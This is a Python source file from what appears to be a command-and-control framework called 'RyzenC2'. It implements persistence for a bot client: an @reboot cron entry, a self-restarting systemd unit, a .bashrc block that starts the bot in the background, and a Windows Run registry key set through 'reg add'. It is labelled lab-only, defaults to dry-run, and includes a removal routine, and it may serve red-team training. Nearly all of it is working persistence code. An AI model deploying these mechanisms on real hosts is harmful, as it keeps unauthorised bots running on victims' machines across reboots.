"""bot/persistence.py — persistence helpers (lab / authorized only)
Default: dry-run generates unit/cron snippets. Use apply=True only on owned lab hosts.
"""
import os
import platform
from pathlib import Path
from typing import Dict, List, Optional


def install_cron(command: str = "python3 /opt/ryzenc2/bot/bot_client.py", apply: bool = False) -> Dict:
    line = f"@reboot {command} >/dev/null 2>&1"
    result = {"method": "cron", "line": line, "applied": False}
    if apply and os.name != "nt":
        try:
            cron_path = Path.home() / ".ryzenc2_lab_cron"
            cron_path.write_text(line + "\n", encoding="utf-8")
            result["applied"] = True
            result["path"] = str(cron_path)
            result["note"] = "Wrote lab file only — install with: crontab ~/.ryzenc2_lab_cron"
        except Exception as e:
            result["error"] = str(e)
    return result


def install_systemd(service_name: str = "ryzenc2-bot",
                    exec_path: str = "/opt/ryzenc2/bot/bot_client.py",
                    apply: bool = False) -> Dict:
    unit = f"""[Unit]
Description=RyzenC2 Lab Bot Client
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {exec_path}
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
    result = {"method": "systemd", "unit": unit, "applied": False}
    if apply and os.name != "nt":
        path = Path.home() / f"{service_name}.service"
        path.write_text(unit, encoding="utf-8")
        result["applied"] = True
        result["path"] = str(path)
        result["note"] = f"User-level unit written. sudo cp {path} /etc/systemd/system/ && systemctl enable --now {service_name}"
    return result


def install_bashrc(command: str = "python3 /opt/ryzenc2/bot/bot_client.py &", apply: bool = False) -> Dict:
    marker = "# RYZENC2-LAB-BOT"
    block = f"\n{marker}\n{command}\n{marker}-END\n"
    result = {"method": "bashrc", "block": block, "applied": False}
    if apply and os.name != "nt":
        bashrc = Path.home() / ".bashrc"
        text = bashrc.read_text(encoding="utf-8") if bashrc.exists() else ""
        if marker not in text:
            bashrc.write_text(text + block, encoding="utf-8")
            result["applied"] = True
            result["path"] = str(bashrc)
    return result


def install_registry_run_key(command: str = "python bot_client.py", apply: bool = False) -> Dict:
    """Windows lab: returns reg add command; apply runs only if on Windows and apply=True."""
    key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    name = "RyzenC2LabBot"
    cmd = f'reg add "{key}" /v {name} /t REG_SZ /d "{command}" /f'
    result = {"method": "registry_run", "command": cmd, "applied": False}
    if apply and platform.system() == "Windows":
        try:
            import subprocess
            subprocess.run(cmd, shell=True, check=False, capture_output=True)
            result["applied"] = True
        except Exception as e:
            result["error"] = str(e)
    return result


def list_methods() -> List[str]:
    return ["cron", "systemd", "bashrc", "registry_run"]


def remove_all(apply: bool = False) -> Dict:
    removed = []
    if apply:
        for f in [Path.home() / ".ryzenc2_lab_cron", Path.home() / "ryzenc2-bot.service"]:
            if f.exists():
                f.unlink()
                removed.append(str(f))
        bashrc = Path.home() / ".bashrc"
        if bashrc.exists():
            text = bashrc.read_text(encoding="utf-8")
            if "# RYZENC2-LAB-BOT" in text:
                lines = text.splitlines()
                out, skip = [], False
                for ln in lines:
                    if "# RYZENC2-LAB-BOT" in ln and "END" not in ln:
                        skip = True
                        continue
                    if skip and "RYZENC2-LAB-BOT-END" in ln:
                        skip = False
                        continue
                    if not skip:
                        out.append(ln)
                bashrc.write_text("\n".join(out) + "\n", encoding="utf-8")
                removed.append(str(bashrc))
    return {"removed": removed, "applied": apply}
